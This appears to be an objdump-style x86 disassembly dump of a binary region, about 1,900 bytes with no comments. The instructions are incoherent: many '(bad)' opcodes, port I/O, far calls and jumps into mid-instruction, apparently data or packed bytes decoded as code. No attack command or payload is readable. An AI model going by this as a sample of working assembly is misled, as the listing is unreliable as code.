  40b681:	push   ecx
  40b682:	fwait
  40b683:	pop    edi
  40b684:	int    0x34
  40b686:	cmp    ebx,edx
  40b688:	or     edi,edi
  40b68a:	xchg   edx,eax
  40b68b:	ret    
  40b68c:	mov    esp,0xcae943e6
  40b691:	cmp    ax,0x3c1d
  40b695:	cmp    eax,DWORD PTR [ecx-0x3a]
  40b698:	xchg   BYTE PTR [ebp-0x1162eafa],ah
  40b69e:	fist   WORD PTR [esi-0x3337ed04]
  40b6a4:	je     0x40b705
  40b6a6:	fcom   DWORD PTR [ecx]
  40b6a8:	neg    DWORD PTR ds:0x25eaf60a
  40b6ae:	sub    ebx,esi
  40b6b0:	jnp    0x40b6c3
  40b6b2:	in     eax,0x51
  40b6b4:	mov    ah,0x3d
  40b6b6:	xchg   ecx,eax
  40b6b7:	pushf  
  40b6b8:	mov    edi,0x6f3b2bec
  40b6bd:	in     eax,0xe
  40b6bf:	fist   DWORD PTR ds:0x2b8fe31b
  40b6c5:	out    dx,eax
  40b6c6:	push   es
  40b6c7:	push   ebx
  40b6c8:	fmul   DWORD PTR [ecx-0x7f61037c]
  40b6ce:	(bad)  
  40b6cf:	sbb    ch,BYTE PTR [ebx+0x53]
  40b6d2:	outs   dx,DWORD PTR ds:[esi]
  40b6d3:	and    eax,0x7978423a
  40b6d8:	adc    al,ah
  40b6da:	in     al,dx
  40b6db:	inc    eax
  40b6dc:	repnz les edi,FWORD PTR [bp+di]
  40b6e0:	imul   ebx,DWORD PTR [eax],0xffffff92
  40b6e3:	les    ebp,FWORD PTR [esi]
  40b6e5:	imul   esp,DWORD PTR [ecx-0x11c4df81],0x98c3f76e
  40b6ef:	stc    
  40b6f0:	call   0x2849:0x8cb78281
  40b6f7:	rol    DWORD PTR ds:0xd198e03c,0x55
  40b6fe:	sar    BYTE PTR [edi],cl
  40b700:	es ins DWORD PTR es:[edi],dx
  40b702:	fcomp  QWORD PTR [ebx+0x43]
  40b705:	or     DWORD PTR [eax-0x6c1e80d],0x47
  40b70c:	das    
  40b70d:	(bad)  
  40b70e:	out    dx,eax
  40b70f:	and    ebp,DWORD PTR [ebx]
  40b711:	popa   
  40b712:	dec    esi
  40b713:	or     eax,0xdf77904f
  40b718:	mov    ah,0xf1
  40b71a:	in     al,0xb
  40b71c:	jmp    0x40b6cd
  40b71e:	retf   
  40b71f:	popa   
  40b720:	push   ecx
  40b721:	cmp    cl,BYTE PTR [edi+ebp*2]
  40b724:	sbb    eax,0x65bdb3d4
  40b729:	or     DWORD PTR [edi],ecx
  40b72b:	mov    ah,0xe7
  40b72d:	sub    edi,DWORD PTR [ebx+0xb571e46]
  40b733:	shr    ch,1
  40b735:	pop    ecx
  40b736:	(bad)  
  40b737:	ror    DWORD PTR [edi-0xb],1
  40b73a:	mov    ah,0x6c
  40b73c:	fs mov bh,0xa8
  40b73f:	xchg   edi,eax
  40b740:	mov    bl,bh
  40b742:	inc    esp
  40b743:	and    ah,dl
  40b745:	(bad)  
  40b746:	repnz push 0x6f2c1803
  40b74c:	xchg   BYTE PTR [ebp+0x2522b621],bh
  40b752:	das    
  40b753:	pusha  
  40b754:	iret   
  40b755:	dec    ebx
  40b756:	loope  0x40b7ae
  40b758:	and    al,0x99
  40b75a:	adc    BYTE PTR [ebx],ch
  40b75c:	xchg   ecx,eax
  40b75d:	lods   eax,DWORD PTR ds:[esi]
  40b75e:	imul   edx,ebp,0x35
  40b761:	cmp    eax,0x8e4cadf5
  40b766:	dec    esi
  40b767:	xchg   esp,eax
  40b768:	sbb    BYTE PTR [ebx],0x91
  40b76b:	shl    DWORD PTR [edx+ecx*4-0xcb39e53],1
  40b772:	idiv   BYTE PTR [ebx-0x7c5f4755]
  40b778:	ins    BYTE PTR es:[edi],dx
  40b779:	dec    eax
  40b77a:	rcr    BYTE PTR [edx-0x50],0x84
  40b77e:	jl     0x40b78a
  40b780:	sub    ah,BYTE PTR [ebx+0x775e6fcc]
  40b786:	mov    ebx,0xa3d30afb
  40b78b:	cmp    edi,DWORD PTR [esi-0x80]
  40b78e:	clc    
  40b78f:	stos   DWORD PTR es:[edi],eax
  40b790:	call   0x8803:0x5fe3be73
  40b797:	(bad)
  40b79a:	mov    ebx,0xa9925cf7
  40b79f:	stos   DWORD PTR es:[edi],eax
  40b7a0:	jle    0x40b73e
  40b7a2:	mov    ah,0x31
  40b7a4:	mov    edi,0xbbbe17c0
  40b7a9:	inc    esi
  40b7aa:	mov    ebp,0x2f0b7460
  40b7af:	repnz sti 
  40b7b1:	aad    0xe0
  40b7b3:	push   esp
  40b7b4:	mov    al,ds:0x96d91ffd
  40b7b9:	sbb    dh,dh
  40b7bb:	pop    edi
  40b7bc:	xor    BYTE PTR [edi-0x6bd2e841],cl
  40b7c2:	shr    BYTE PTR [esi-0x34],1
  40b7c5:	cld    
  40b7c6:	inc    esi
  40b7c7:	xchg   ebx,eax
  40b7c8:	and    DWORD PTR [ebx],0x95efd790
  40b7ce:	push   edi
  40b7cf:	(bad)  
  40b7d0:	pop    edx
  40b7d1:	cmp    BYTE PTR [eax+0x19],ah
  40b7d4:	or     bh,BYTE PTR [esi-0x34]
  40b7d7:	out    dx,eax
  40b7d8:	sub    DWORD PTR [edi+0xb],edx
  40b7db:	hlt    
  40b7dc:	icebp  
  40b7dd:	sti    
  40b7de:	imul   DWORD PTR [esi]
  40b7e0:	mov    al,BYTE PTR [ebx]
  40b7e2:	jno    0x40b7f8
  40b7e4:	sub    dl,BYTE PTR [esi+ebx*4+0x6f]
  40b7e8:	jae    0x40b7b9
  40b7ea:	enter  0x947d,0xfd
  40b7ee:	dec    edx
  40b7ef:	push   ss
  40b7f0:	(bad)  
  40b7f1:	mov    esi,DWORD PTR [esi-0x35]
  40b7f4:	pop    es
  40b7f5:	jo     0x40b7b6
  40b7f7:	push   esi
  40b7f8:	(bad)
  40b7fc:	jb     0x40b782
  40b7fe:	xchg   esp,eax
  40b7ff:	and    eax,0x53daa465
  40b804:	mov    BYTE PTR [ebp-0x3],bl
  40b807:	adc    al,0x7d
  40b809:	xchg   BYTE PTR [edx+0x79908deb],dh
  40b80f:	and    al,0x86
  40b811:	fist   WORD PTR [eax]
  40b813:	gs int3 
  40b815:	xor    eax,0x4ce4a600
  40b81a:	lahf   
  40b81b:	add    dh,cl
  40b81d:	push   cs
  40b81e:	jo     0x40b7d8
  40b820:	fidivr DWORD PTR [ebx-0x5e927513]
  40b826:	pop    esi
  40b827:	sub    edx,DWORD PTR [edx+0x868f5e5]
  40b82d:	test   al,0x22
  40b82f:	rol    BYTE PTR [ebp-0x1d],cl
  40b832:	cs nop
  40b834:	stos   BYTE PTR es:[edi],al
  40b835:	fcom   DWORD PTR [eax-0x46]
  40b838:	(bad)  
  40b839:	fcomp  st(7)
  40b83b:	inc    edi
  40b83c:	mov    edx,0x50404b9d
  40b841:	cmp    BYTE PTR [ecx+0x1e292a5c],bh
  40b847:	cmp    ebx,ebp
  40b849:	in     al,dx
  40b84a:	pop    es
  40b84b:	ss es jo 0x40b7e9
  40b84f:	data16 sub ah,BYTE PTR [ecx]
  40b852:	add    DWORD PTR [eax-0x41eef6df],edx
  40b858:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40b85a:	iret   
  40b85b:	leave  
  40b85c:	das    
  40b85d:	das    
  40b85e:	fisub  WORD PTR [edx+eiz*4-0x71]
  40b862:	ins    DWORD PTR es:[edi],dx
  40b863:	pushf  
  40b864:	adc    DWORD PTR [edx],0x71
  40b867:	xor    ebx,DWORD PTR [edx]
  40b869:	fistp  WORD PTR [ecx]
  40b86b:	jne    0x40b808
  40b86d:	(bad)  
  40b86e:	xchg   esi,eax
  40b86f:	sbb    eax,DWORD PTR [edi+0x6e611fea]
  40b875:	sahf   
  40b876:	cmp    ecx,DWORD PTR [edi]
  40b878:	mov    ebx,0xcf27fc58
  40b87d:	add    al,0x53
  40b87f:	jae    0x40b894
  40b881:	sbb    eax,0xf467a228
  40b886:	push   cs
  40b887:	mov    eax,0x715a77a9
  40b88c:	pop    es
  40b88d:	popa   
  40b88e:	mov    edi,DWORD PTR [eax-0x1ed7acc]
  40b894:	push   es
  40b895:	or     dl,0xf0
  40b898:	adc    ch,BYTE PTR [esi+0x72]
  40b89b:	call   0x8080:0x60381df8
  40b8a2:	mov    WORD PTR [esi],?
  40b8a4:	dec    edi
  40b8a5:	lods   eax,DWORD PTR ds:[esi]
  40b8a6:	fwait
  40b8a7:	push   edx
  40b8a8:	cmp    eax,ebx
  40b8aa:	jecxz  0x40b8b5
  40b8ac:	leave  
  40b8ad:	outs   dx,DWORD PTR ds:[esi]
  40b8ae:	(bad)  
  40b8af:	aaa    
  40b8b0:	aas    
  40b8b1:	and    al,0x1e
  40b8b3:	and    DWORD PTR [esi+0xd],edi
  40b8b6:	aas    
  40b8b7:	jmp    0xae2a4ae2
  40b8bc:	or     DWORD PTR [ebp-0x185ba72d],0xcaaec36
  40b8c6:	fist   DWORD PTR [edx]
  40b8c8:	push   ecx
  40b8c9:	dec    esi
  40b8ca:	adc    eax,edx
  40b8cc:	sbb    al,0xfa
  40b8ce:	pop    eax
  40b8cf:	ret    0x2520
  40b8d2:	jno    0x40b902
  40b8d4:	xchg   ebp,eax
  40b8d5:	loope  0x40b8b1
  40b8d7:	fsub   st(1),st
  40b8d9:	fwait
  40b8da:	js     0x40b890
  40b8dc:	and    DWORD PTR [eax+eiz*1-0x37f0dbd3],0x4b
  40b8e4:	sub    eax,0x124b1f5c
  40b8e9:	mov    ecx,DWORD PTR [bx+si]
  40b8ec:	xor    eax,ebp
  40b8ee:	faddp  st(5),st
  40b8f0:	jno    0x40b8b2
  40b8f2:	aam    0x18
  40b8f4:	call   0x321:0xf384c8b2
  40b8fb:	pop    edi
  40b8fc:	hlt    
  40b8fd:	mov    edx,0x65fc7c6e
  40b902:	cmp    esi,DWORD PTR [ebp-0x5b]
  40b905:	sbb    eax,0xb76b250e
  40b90a:	daa    
  40b90b:	jmp    0x40b8d9
  40b90d:	mov    dh,0xf4
  40b90f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b910:	push   esp
  40b911:	and    DWORD PTR [ebx+0x6],esi
  40b914:	mov    ecx,0x80f26e34
  40b919:	jns    0x40b93f
  40b91b:	lahf   
  40b91c:	lahf   
  40b91d:	mov    fs,esp
  40b91f:	(bad)  
  40b920:	in     eax,dx
  40b921:	in     al,0xf8
  40b923:	xlat   BYTE PTR ds:[ebx]
  40b924:	add    esp,edx
  40b926:	cmp    al,0x59
  40b928:	mov    esi,0x1b7a19b6
  40b92d:	adc    eax,0xd438e408
  40b932:	aam    0x71
  40b934:	inc    eax
  40b935:	es std 
  40b937:	cmp    ecx,DWORD PTR [edi+0x7a3c32d1]
  40b93d:	dec    ecx
  40b93e:	jo     0x40b968
  40b940:	(bad)  
  40b941:	fstp   TBYTE PTR [eax-0x4f6c37e]
  40b947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b948:	and    cl,BYTE PTR ss:0x1fc6064a
  40b94f:	xchg   esp,eax
  40b950:	addr16 inc esp
  40b952:	xchg   ebx,eax
  40b953:	stos   DWORD PTR es:[edi],eax
  40b954:	pop    DWORD PTR [esi+eax*2]
  40b957:	xor    DWORD PTR [ecx-0xcf6ce89],eax
  40b95d:	add    bl,BYTE PTR [esi+0x3b]
  40b960:	mov    edx,0x8a7745c
  40b965:	cmp    eax,0x95820f90
  40b96a:	mov    esp,0xc14f4b0b
  40b96f:	hlt    
  40b970:	dec    ebx
  40b971:	data16 lahf 
  40b973:	not    bl
  40b975:	xchg   esi,eax
  40b976:	jle    0x40b958
  40b978:	mov    esp,0x3b286e18
  40b97d:	les    ecx,FWORD PTR [ebx-0x7f]
  40b980:	scas   eax,DWORD PTR es:[edi]
  40b981:	(bad)  
  40b982:	push   ds
  40b983:	pop    ebp
  40b984:	les    ecx,FWORD PTR ds:0x50663361
  40b98a:	loopne 0x40b935
  40b98c:	mov    dh,0x22
  40b98e:	mov    esi,0x28f7db98
  40b993:	cmc    
  40b994:	jge    0x40b9f0
  40b996:	xchg   ebx,eax
  40b997:	sub    cl,BYTE PTR [ebx+0x31d56674]
  40b99d:	jns    0x40b946
  40b99f:	xchg   esp,eax
  40b9a0:	dec    eax
  40b9a1:	sub    BYTE PTR [ebx],bl
  40b9a3:	pop    eax
  40b9a4:	rcl    BYTE PTR [edi+0x711b6c89],1
  40b9aa:	and    ah,BYTE PTR [edi]
  40b9ac:	mov    esp,0x43aec183
  40b9b1:	and    al,0x93
  40b9b3:	adc    dh,bh
  40b9b5:	pop    ebp
  40b9b6:	mov    bh,BYTE PTR [ebx]
  40b9b8:	fld    QWORD PTR [ebx]
  40b9ba:	add    ebx,DWORD PTR [esi+eax*1+0x6cd975c3]
  40b9c1:	xor    ah,BYTE PTR [ebx+0x222a0480]
  40b9c7:	adc    esp,DWORD PTR fs:[edi]
  40b9ca:	ror    BYTE PTR [edi],0x60
  40b9cd:	add    BYTE PTR [ebx+0x33096cef],ch
  40b9d3:	mov    ch,0x27
  40b9d5:	jle    0x40b95d
  40b9d7:	sti    
  40b9d8:	or     edi,DWORD PTR [ebp+eiz*2-0x17]
  40b9dc:	sub    BYTE PTR [eax],al
  40b9de:	js     0x40b972
  40b9e0:	not    BYTE PTR [eax+0x62]
  40b9e3:	pop    ecx
  40b9e4:	aas    
  40b9e5:	or     edi,eax
  40b9e7:	ins    DWORD PTR es:[edi],dx
  40b9e8:	cmp    BYTE PTR [esi-0x34],al
  40b9eb:	aaa    
  40b9ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9ed:	cwde   
  40b9ee:	repz xchg ch,dh
  40b9f1:	dec    edi
  40b9f2:	lock call 0x398c:0x3563872f
  40b9fa:	es pop es
  40b9fc:	sbb    DWORD PTR [edi],edx
  40b9fe:	and    BYTE PTR [ebp-0x424dedc9],0xc8
  40ba05:	cmp    esp,0x2b
  40ba08:	sbb    eax,DWORD PTR [ebx-0x60d7bc12]
  40ba0e:	push   0x5d
  40ba10:	imul   esi,DWORD PTR [esi*4+0x785229ae],0x40090408
  40ba1b:	ja     0x40ba75
  40ba1d:	xchg   edi,eax
  40ba1e:	cs pusha 
  40ba20:	sbb    al,0xb1
  40ba22:	pop    ss
  40ba23:	sub    ch,BYTE PTR [ebx+0x1]
  40ba26:	mov    ebp,0xd1901ad3
  40ba2b:	retf   
  40ba2c:	ss popa 
  40ba2e:	call   0xbbe5b4e6
  40ba33:	sub    edi,DWORD PTR [ebx]
  40ba35:	(bad)  
  40ba36:	ins    BYTE PTR es:[edi],dx
  40ba37:	iret   
  40ba38:	push   ebp
  40ba39:	pushf  
  40ba3a:	inc    edi
  40ba3b:	icebp  
  40ba3c:	sub    al,0x82
  40ba3e:	jo     0x40ba2e
  40ba40:	test   BYTE PTR [ecx],dh
  40ba42:	sbb    ebp,ebp
  40ba44:	xchg   BYTE PTR [eax-0x6036cfef],dh
  40ba4a:	adc    eax,0x792a4a6f
  40ba4f:	mov    gs,WORD PTR [edi+0x65]
  40ba52:	cld    
  40ba53:	retf   0x54c1
  40ba56:	pop    esi
  40ba57:	jb     0x40ba88
  40ba59:	retf   0xa5f8
  40ba5c:	mov    cl,0x86
  40ba5e:	rcr    edi,cl
  40ba60:	setp   BYTE PTR [ecx+0x5c13a5c0]
  40ba67:	pop    esi
  40ba68:	(bad)  
  40ba69:	sbb    ch,BYTE PTR [edi]
  40ba6b:	dec    esp
  40ba6c:	(bad)  
  40ba6d:	cmp    edi,esi
  40ba6f:	fdiv   st,st(6)
  40ba71:	mov    ecx,0xad872d2
  40ba76:	cmc    
  40ba77:	shl    BYTE PTR [edi-0x4d],1
  40ba7a:	loop   0x40ba8c
  40ba7c:	dec    esi
  40ba7d:	pop    esp
  40ba7e:	jne    0x40bad3
  40ba80:	int3   
  40ba81:	xor    bh,BYTE PTR [edi-0x70]
  40ba84:	sub    al,0x27
  40ba86:	mov    ch,0xb2
  40ba88:	call   0x294:0x2d3d0f47
  40ba8f:	push   edi
  40ba90:	adc    BYTE PTR [eax+0x2d],dl
  40ba93:	fadd   DWORD PTR [edx-0x7148c725]
  40ba99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba9a:	cmp    ah,ah
  40ba9c:	mov    ch,0xeb
  40ba9e:	dec    ebp
  40ba9f:	pop    esi
  40baa0:	je     0x40bb1b
  40baa2:	adc    eax,0xf5bf4d6b
  40baa7:	sbb    BYTE PTR [ebx+0x26],bl
  40baaa:	xchg   BYTE PTR [ecx+eiz*1-0xe],al
  40baae:	neg    DWORD PTR [esi+0x14]
  40bab1:	cmp    eax,DWORD PTR [ebp+0x20]
  40bab4:	cdq    
  40bab5:	retf   0x997e
  40bab8:	inc    ebx
  40bab9:	mov    edx,0x90ea4540
  40babe:	or     al,BYTE PTR [edi+0x161ffe9f]
  40bac4:	sub    BYTE PTR [esi-0x79],ah
  40bac7:	pushf  
  40bac8:	mov    esi,0x1335ed57
  40bacd:	mov    bh,ah
  40bacf:	ror    edx,0x3b
  40bad2:	push   ss
  40bad3:	ffree  st(4)
  40bad5:	cmp    eax,0x92f28ae5
  40bada:	add    al,0x7
  40badc:	sbb    DWORD PTR ds:0xaf248b43,ecx
  40bae2:	mov    ecx,0x68804cb1
  40bae7:	mov    gs,ebp
  40bae9:	jne    0x40ba70
  40baeb:	xor    al,0x33
  40baed:	call   0x5dd4ec93
  40baf2:	xor    esi,DWORD PTR [eax+0x691b03eb]
  40baf8:	jge    0x40bb63
  40bafa:	push   edi
  40bafb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bafc:	add    eax,0x4f6da87e
  40bb01:	(bad)  
  40bb03:	(bad)  
  40bb05:	call   0x4656:0xaacae302
  40bb0c:	popa   
  40bb0d:	sbb    bh,al
  40bb0f:	mov    DWORD PTR [ebx],esp
  40bb11:	gs dec esp
  40bb13:	pushf  
  40bb14:	call   0xf792:0x5f304450
  40bb1b:	cmp    eax,0x9409a534
  40bb20:	(bad)  
  40bb21:	jb     0x40bace
  40bb23:	dec    edx
  40bb24:	push   ebp
  40bb25:	mov    cl,0x55
  40bb27:	in     al,dx
  40bb28:	xor    BYTE PTR [edi],0xf9
  40bb2b:	fistp  QWORD PTR [esi]
  40bb2d:	inc    edx
  40bb2e:	xchg   bx,ax
  40bb30:	loopne 0x40bbaf
  40bb32:	fdivp  st(3),st
  40bb34:	add    ecx,edx
  40bb36:	push   ebx
  40bb37:	cmp    al,0xd
  40bb39:	outs   dx,BYTE PTR ds:[esi]
  40bb3a:	out    dx,al
  40bb3b:	adc    ah,0x2c
  40bb3e:	ins    DWORD PTR es:[edi],dx
  40bb3f:	sub    BYTE PTR [ecx*8-0x3c686feb],0xf7
  40bb47:	jg     0x40bace
  40bb49:	mov    bh,0x6
  40bb4b:	cmp    DWORD PTR [eax],ebx
  40bb4d:	ds nop
  40bb4f:	sub    al,0x4d
  40bb51:	gs jmp 0x73c5eb5
  40bb57:	jp     0x40bbd2
  40bb59:	adc    DWORD PTR [edx+0x3237db4],ebp
  40bb5f:	sub    eax,0x6054f60f
  40bb64:	jg     0x40bb0a
  40bb66:	mov    ch,0x84
  40bb68:	mov    eax,ds:0x8d68ad7d
  40bb6d:	mov    al,ds:0x55b87535
  40bb72:	lahf   
  40bb73:	int3   
  40bb74:	nop
  40bb75:	push   edx
  40bb76:	fist   WORD PTR [edx+0x63]
  40bb79:	push   cs
  40bb7a:	pushf  
  40bb7b:	fwait
  40bb7c:	out    0x1f,eax
  40bb7e:	ret    0x25ef
  40bb81:	sbb    esp,ebx
  40bb83:	xchg   DWORD PTR [esi-0x3f],edi
  40bb86:	mov    edx,0xe9657edb
  40bb8b:	dec    esi
  40bb8c:	jb     0x40bc03
  40bb8e:	leave  
  40bb8f:	mov    BYTE PTR [eax],dl
  40bb91:	out    dx,eax
  40bb92:	xchg   BYTE PTR [eax+eax*8+0x25],cl
  40bb96:	ds jno 0x40bb6c
  40bb99:	push   ebx
  40bb9a:	add    ch,bl
  40bb9c:	dec    edx
  40bb9d:	nop
  40bb9e:	xor    DWORD PTR [ecx-0x6a],ecx
  40bba1:	fs push cs
  40bba3:	jle    0x40bb58
  40bba5:	adc    al,0x37
  40bba7:	mov    ds:0x636d038f,eax
  40bbac:	cmp    bh,0xf9
  40bbaf:	repnz mov ds:0xf8c94dd9,eax
  40bbb5:	addr16 pop edx
  40bbb7:	int3   
  40bbb8:	retf   
  40bbb9:	pop    eax
  40bbba:	dec    ebp
  40bbbb:	pop    ds
  40bbbc:	mov    ss:0x50eb2bb3,eax
  40bbc2:	jg     0x40bbaa
  40bbc4:	add    edx,esp
  40bbc6:	cmp    al,0x7f
  40bbc8:	jle    0x40bbeb
  40bbca:	cmp    BYTE PTR [eax-0x43055907],0xbb
  40bbd1:	or     eax,DWORD PTR [ebx+0x5b3a49ee]
  40bbd7:	pop    esp
  40bbd8:	lods   eax,DWORD PTR ds:[esi]
  40bbd9:	out    0x25,al
  40bbdb:	or     BYTE PTR [ecx+0x3b9ab355],cl
  40bbe1:	imul   dl
  40bbe3:	sbb    DWORD PTR [eax+0x51],0xffffffdf
  40bbe7:	add    al,0x4d
  40bbe9:	xchg   al,dl
  40bbeb:	in     eax,0x49
  40bbed:	fld    TBYTE PTR [edi-0x69d9afec]
  40bbf3:	sub    eax,0x84144b84
  40bbf8:	hlt    
  40bbf9:	mov    ecx,edi
  40bbfb:	dec    edx
  40bbfc:	lds    edx,FWORD PTR [esi+0x6b30ab20]
  40bc02:	mov    BYTE PTR [esi+eiz*1+0x4c753b88],ch
  40bc09:	iret   
  40bc0a:	and    eax,0xf8b35129
  40bc0f:	es push eax
  40bc11:	push   eax
  40bc12:	jg     0x40bc04
  40bc14:	dec    eax
  40bc15:	xchg   dh,ch
  40bc17:	outs   dx,BYTE PTR ds:[esi]
  40bc18:	ss pop ecx
  40bc1a:	mov    edi,es
  40bc1c:	xor    ecx,ebx
  40bc1e:	shr    ebp,1
  40bc20:	inc    edi
  40bc21:	fcmovnb st,st(3)
  40bc23:	sub    dl,bh
  40bc25:	jmp    0x40bc24
  40bc27:	loop   0x40bc89
  40bc29:	push   ebx
  40bc2a:	test   DWORD PTR [esi+0x7dbb45dd],0x79047d0f
  40bc34:	mov    ebp,0xfcccd37a
  40bc39:	scas   al,BYTE PTR es:[edi]
  40bc3a:	(bad)  
  40bc3b:	xor    BYTE PTR [ebx-0x6d7cd82f],cl
  40bc41:	cmp    esi,DWORD PTR [edx-0x53]
  40bc44:	cmp    eax,0xf296386a
  40bc49:	call   0xf5add9c1
  40bc4e:	mov    ch,dl
  40bc50:	int    0x9d
  40bc52:	mov    esi,0x68a3506e
  40bc57:	push   edx
  40bc58:	cmp    BYTE PTR [esi-0x58],ch
  40bc5b:	and    eax,DWORD PTR [ebx]
  40bc5d:	adc    esi,edx
  40bc5f:	or     DWORD PTR [esi],edi
  40bc61:	pusha  
  40bc62:	daa    
  40bc63:	mov    esp,0x3be30fce
  40bc68:	xor    ecx,esi
  40bc6a:	imul   ebp,DWORD PTR [edx],0xcd1ad42d
  40bc70:	mov    bl,0x84
  40bc72:	xor    al,0x91
  40bc74:	or     cl,BYTE PTR [edx-0x7a4ffcb6]
  40bc7a:	sbb    al,0x45
  40bc7c:	jnp    0x40bca0
  40bc7e:	mov    ds,eax
  40bc80:	in     al,0xcf
  40bc82:	or     ch,BYTE PTR [ecx+0x6e]
  40bc85:	jae    0x40bcc6
  40bc87:	mov    edi,0xac9847d1
  40bc8c:	sbb    ch,BYTE PTR ds:0x20c7d084
  40bc92:	xchg   ecx,eax
  40bc93:	gs and al,0xc7
  40bc96:	xlat   BYTE PTR ds:[ebx]
  40bc97:	push   es
  40bc98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc99:	test   al,0x6c
  40bc9b:	xor    ebp,edx
  40bc9d:	clc    
  40bc9e:	mov    al,0x5f
  40bca0:	cmp    BYTE PTR [ecx+0x79],dl
  40bca3:	sub    BYTE PTR [ebx],ah
  40bca5:	shr    DWORD PTR [eax+0x4b],1
  40bca8:	jl     0x40bcc8
  40bcaa:	daa    
  40bcab:	inc    ecx
  40bcac:	jno    0x40bccc
  40bcae:	inc    ecx
  40bcaf:	mov    al,ds:0x75dd1b91
  40bcb4:	cmp    edi,ecx
  40bcb6:	cmp    DWORD PTR [esi+0x68bbc7d8],eax
  40bcbc:	push   esi
  40bcbd:	imul   edi,esp,0xffffffaa
  40bcc0:	stc    
  40bcc1:	scas   eax,DWORD PTR es:[edi]
  40bcc2:	test   al,0xec
  40bcc4:	add    al,0xec
  40bcc6:	mov    cl,0xb4
  40bcc8:	ja     0x40bd08
  40bcca:	fidivr WORD PTR [esi+0x12561c6d]
  40bcd0:	mov    ch,0xc6
  40bcd2:	lods   eax,DWORD PTR ds:[esi]
  40bcd3:	test   edi,edx
  40bcd5:	rcr    ebx,0xac
  40bcd8:	hlt    
  40bcd9:	std    
  40bcda:	jno    0x40bcc3
  40bcdc:	push   es
  40bcdd:	and    ah,BYTE PTR [edi]
  40bcdf:	jmp    0x7b04b2c6
  40bce4:	pop    ecx
  40bce5:	jb     0x40bcab
  40bce7:	sub    ecx,0x30
  40bcea:	(bad)  
  40bceb:	xchg   ecx,eax
  40bcec:	inc    ecx
  40bced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcee:	push   edi
  40bcef:	(bad)  
  40bcf0:	sbb    eax,0x666206e9
  40bcf5:	mov    eax,ds:0x4cbad97e
  40bcfa:	adc    DWORD PTR [esi+0x3df058ba],edi
  40bd00:	or     ecx,DWORD PTR [edi-0x79]
  40bd03:	mov    eax,ecx
  40bd05:	outs   dx,BYTE PTR ds:[esi]
  40bd06:	fisub  WORD PTR [ebx+0x75]
  40bd09:	add    BYTE PTR [edx],al
  40bd0b:	add    ebx,eax
  40bd0d:	cmp    esi,esp
  40bd0f:	mov    fs,WORD PTR [edx]
  40bd11:	xlat   BYTE PTR ds:[ebx]
  40bd12:	mov    edi,0x53a1736d
  40bd17:	test   eax,0x560bd0e4
  40bd1c:	repz (bad) 
  40bd1e:	sar    BYTE PTR [eax],cl
  40bd20:	shr    DWORD PTR [esp+ebx*8],1
  40bd23:	mul    DWORD PTR [edx]
  40bd25:	fdiv   DWORD PTR [edi-0x2691179e]
  40bd2b:	pop    ds
  40bd2c:	mov    bl,ah
  40bd2e:	or     eax,0x61052915
  40bd33:	xchg   BYTE PTR [edi],bl
  40bd35:	test   eax,0x4971e8b9
  40bd3a:	fdivr  st,st(1)
  40bd3c:	aaa    
  40bd3d:	mov    al,0x78
  40bd3f:	pop    ss
  40bd40:	xchg   esi,eax
  40bd41:	dec    ecx
  40bd42:	mov    bh,dl
  40bd44:	aam    0x89
  40bd46:	mov    ebp,0x81dad2a4
  40bd4b:	retf   
  40bd4c:	cmp    eax,0x94844874
  40bd51:	cmp    eax,0x3da2f6e6
  40bd56:	push   ebp
  40bd57:	clc    
  40bd58:	repnz test BYTE PTR [ebx+ebp*4],ch
  40bd5c:	pop    ecx
  40bd5d:	mov    BYTE PTR [ecx],0xa3
  40bd60:	xchg   esi,eax
  40bd61:	xchg   edx,eax
  40bd62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd63:	push   eax
  40bd64:	(bad)  
  40bd66:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40bd68:	adc    al,0xe0
  40bd6a:	xor    BYTE PTR [ecx],bh
  40bd6c:	sar    BYTE PTR [ebx+0x22350c7f],1
  40bd72:	cli    
  40bd73:	aaa    
  40bd74:	cld    
  40bd75:	mov    WORD PTR [edx+0x4b],cs
  40bd78:	fisubr WORD PTR [ebp+0x1642dc33]
  40bd7e:	in     al,dx
  40bd7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd80:	and    al,0xcf
  40bd82:	ds call 0x43af:0x3c91bb20
  40bd8a:	lds    esp,FWORD PTR [ebx-0x40]
  40bd8d:	js     0x40bd23
  40bd8f:	les    esi,FWORD PTR [ecx+0x26d52033]
  40bd95:	je     0x40bd4e
  40bd97:	not    BYTE PTR [esi]
  40bd99:	jno    0x40bddc
  40bd9b:	aam    0xea
  40bd9d:	or     dh,bl
  40bd9f:	mov    eax,ds:0xb3a1547e
  40bda4:	jbe    0x40bd49
  40bda6:	xchg   edi,eax
  40bda7:	mov    esp,0x2c9f38a6
  40bdac:	retf   0xe345
  40bdaf:	lahf   
  40bdb0:	mov    ds:0xee54d306,al
  40bdb5:	add    DWORD PTR [esp+esi*8],edx
  40bdb8:	fsub   DWORD PTR [edi+0x5b]
  40bdbb:	or     DWORD PTR [ebx],ebp
  40bdbd:	(bad)  
  40bdbe:	adc    al,0xff
  40bdc0:	xor    edx,DWORD PTR ds:0x104426a8
  40bdc6:	mov    eax,0x68b9a24c
  40bdcb:	inc    ebp
  40bdcc:	xchg   ebx,eax
  40bdcd:	jmp    0x40bd55
  40bdcf:	xchg   ebp,ebx
  40bdd1:	aad    0x72
  40bdd3:	xor    eax,0xd1d1e45f
  40bdd8:	mul    BYTE PTR [edx]
  40bdda:	jle    0x40bd66
  40bddc:	inc    eax
  40bddd:	std    
  40bdde:	retf   0x8f7a
  40bde1:	scas   al,BYTE PTR es:[edi]
  40bde2:	cmp    al,0x1
  40bde4:	pop    ebp
  40bde5:	inc    esp
  40bde6:	jp     0x40bddb
  40bde8:	add    eax,0xfdda45df
  40bded:	(bad)  
  40bdef:	push   edi
  40bdf0:	xor    eax,DWORD PTR [ebx]
  40bdf2:	ja     0x40be23
  40bdf4:	lods   al,BYTE PTR ds:[esi]
  40bdf5:	xchg   edx,eax
  40bdf6:	sub    eax,DWORD PTR [ecx+0x6d19564c]
